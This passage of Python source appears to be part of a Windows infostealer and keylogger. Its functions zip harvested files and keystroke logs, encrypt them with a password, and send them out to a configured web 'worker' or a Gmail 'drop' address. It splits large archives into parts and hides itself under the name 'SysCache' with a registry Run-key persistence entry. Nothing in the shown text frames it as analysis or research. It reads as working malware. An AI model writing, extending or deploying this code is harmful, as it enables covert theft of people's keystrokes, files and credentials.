def pack(d):
    out = d + ".zip"
    if pyzipper:
        with pyzipper.AESZipFile(out, "w", compression=pyzipper.ZIP_DEFLATED,
                                 encryption=pyzipper.WZ_AES) as z:
            z.setpassword(CFG["zip_pw"].encode())
            for r, _, fs in os.walk(d):
                for fn in fs:
                    p = os.path.join(r, fn)
                    z.write(p, os.path.relpath(p, d))
    else:
        import zipfile
        with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
            for r, _, fs in os.walk(d):
                for fn in fs:
                    p = os.path.join(r, fn)
                    z.write(p, os.path.relpath(p, d))
    shutil.rmtree(d, ignore_errors=True)
    return out

# ------------------------------------------------------------------- send
def deliver(subject, fname, data):
    note = "zip pw: " + CFG["zip_pw"]
    if CFG["worker"]:
        payload = json.dumps({"subject": subject, "body": note,
                              "name": fname,
                              "data": base64.b64encode(data).decode()}).encode()
        sig = hmac.new(CFG["secret"].encode(), payload, hashlib.sha256).hexdigest()
        for _ in range(3):
            try:
                req = urllib.request.Request(CFG["worker"].rstrip("/") + "/up",
                                             data=payload, method="POST")
                req.add_header("Content-Type", "application/json")
                req.add_header("X-Sig", sig)
                with urllib.request.urlopen(req, timeout=120) as r:
                    if r.status < 300:
                        return True
            except Exception as e:
                log("worker %r" % e)
                time.sleep(25)
        return False
    try:
        m = EmailMessage()
        m["From"] = "SysCache <%s>" % CFG["smtp_user"]
        m["To"] = CFG["drop"]
        m["Subject"] = subject
        m.set_content(note)
        m.add_attachment(data, maintype="application", subtype="octet-stream",
                         filename=fname)
        with smtplib.SMTP_SSL("smtp.gmail.com", 465,
                              context=ssl.create_default_context(), timeout=90) as s:
            s.login(CFG["smtp_user"], CFG["smtp_pw"])
            s.send_message(m)
        return True
    except Exception as e:
        log("smtp %r" % e)
        return False

def enqueue(tag, fname, data):
    try:
        os.makedirs(QUEUE, exist_ok=True)
        p = os.path.join(QUEUE, "%d|%s|%s" % (int(time.time()), tag, fname))
        with open(p, "wb") as f:
            f.write(data)
        fs = sorted(os.listdir(QUEUE))
        for old in fs[:-20]:
            try:
                os.remove(os.path.join(QUEUE, old))
            except Exception:
                pass
    except Exception as e:
        log("enqueue %r" % e)

def flush():
    if not os.path.isdir(QUEUE):
        return
    for fn in sorted(os.listdir(QUEUE)):
        p = os.path.join(QUEUE, fn)
        bits = fn.split("|", 2)
        if len(bits) < 3:
            try:
                os.remove(p)
            except Exception:
                pass
            continue
        try:
            data = open(p, "rb").read()
        except Exception:
            continue
        if deliver("[%s] %s" % (mid(), bits[1]), bits[2], data):
            try:
                os.remove(p)
            except Exception:
                pass
        else:
            break

def ship(zpath, tag):
    try:
        data = open(zpath, "rb").read()
    except Exception:
        return
    try:
        os.remove(zpath)
    except Exception:
        pass
    base = "%s_%s" % (mid(), datetime.now().strftime("%Y%m%d-%H%M%S"))
    if len(data) <= LIMIT:
        enqueue(tag, base + ".zip", data)
    else:
        parts = [data[i:i + LIMIT] for i in range(0, len(data), LIMIT)]
        for i, p in enumerate(parts, 1):
            enqueue("%s_%dof%d" % (tag, i, len(parts)),
                    "%s.part%02dof%02d" % (base, i, len(parts)), p)
    flush()

def full(tag):
    try:
        ship(pack(harvest()), tag)
    except Exception as e:
        log("harvest %r" % e)

def keyship():
    ks = drain()
    if not ks.strip():
        return
    try:
        os.makedirs(WORK, exist_ok=True)
        p = os.path.join(WORK, "k" + datetime.now().strftime("%H%M%S") + ".zip")
        if pyzipper:
            with pyzipper.AESZipFile(p, "w", compression=pyzipper.ZIP_DEFLATED,
                                     encryption=pyzipper.WZ_AES) as z:
                z.setpassword(CFG["zip_pw"].encode())
                z.writestr("keystrokes.txt", ks)
        else:
            import zipfile
            with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as z:
                z.writestr("keystrokes.txt", ks)
        ship(p, "keys")
    except Exception as e:
        log("keys %r" % e)

# -------------------------------------------------------------- lifecycle
def install():
    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        if not os.path.exists(INSTALL_EXE):
            shutil.copy2(sys.argv[0], INSTALL_EXE)
        subprocess.run(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        "/v", "SysCache", "/t", "REG_SZ", "/d", '"%s"' % INSTALL_EXE, "/f"],
                       capture_output=True, creationflags=NO_WIN, timeout=20)
        return True
    except Exception as e:
        log("install %r" % e)
        return False

def run():
    threading.Thread(target=Keylogger, daemon=True).start()
    threading.Thread(target=clip, daemon=True).start()
    time.sleep(random.uniform(12, 40))
    full("initial")
    last = time.time()
    while True:
        time.sleep(900)
        flush()
        keyship()
        if time.time() - last > 2700:
            full("refresh")
            last = time.time()

def main():
    if not sys.platform.startswith("win"):
        return
    if os.path.abspath(sys.argv[0]).lower() != INSTALL_EXE.lower():
        if not mutex("Global\\SysCacheInst"):
            return
        if install():
            subprocess.Popen([INSTALL_EXE], creationflags=0x00000008 | 0x00000200, close_fds=True)
        time.sleep(2)
        return
    time.sleep(random.uniform(1, 3))
    if not mutex("Global\\SysCacheRun"):
        return
    run()

if __name__ == "__main__":
    try:
        main()
    except Exception:
        log("fatal")
